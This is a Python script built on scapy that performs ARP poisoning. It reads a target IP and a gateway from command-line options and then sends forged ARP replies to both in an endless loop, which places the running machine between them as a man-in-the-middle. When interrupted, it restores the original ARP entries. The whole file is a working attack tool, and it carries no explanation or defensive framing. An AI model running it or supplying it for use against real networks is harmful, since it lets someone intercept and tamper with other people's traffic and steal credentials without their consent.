import scapy.all as scapy
import time
from optparse import OptionParser

parser = OptionParser()


def get_user_input():
    parser.add_option("-t", "--target_ip", dest="target_ip", help="eg:192.268.2.4")
    parser.add_option("-g", "--gateway", dest="gateway", help="eg:192.168.1.1")
    options = parser.parse_args()[0]
    if not options.target_ip:
        print("Enter target ip -t or --target_ip")
    if not options.gateway:
        print("Enter target gateway - g or --gateway")
    return options


def target_mac(ip):
    arp_request_packet = scapy.ARP(pdst=ip)

    arp_broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')

    combined_packet = arp_broadcast / arp_request_packet

    answer_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    return answer_list[0][1].hwsrc


def arp_poison(target_ip, poison_ip):
    target_mac_address = target_mac(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=poison_ip)
    scapy.send(arp_response, verbose=False)


def reset_ip(fooled_ip, gateway):
    fooled_mac = target_mac(fooled_ip)
    gateway_mca = target_mac(gateway)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway, hwsrc=gateway_mca)
    scapy.send(arp_response, verbose=False)


ips = get_user_input()
user_target_ip = ips.target_ip

user_target_gateway = ips.gateway

number = 2
try:
    while True:
        arp_poison(user_target_ip, user_target_gateway)
        arp_poison(user_target_gateway, user_target_ip)
        number += 2
        print("\rSending packet", str(number), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("quit")
    reset_ip(user_target_ip, user_target_gateway)
    reset_ip(user_target_gateway, user_target_ip)
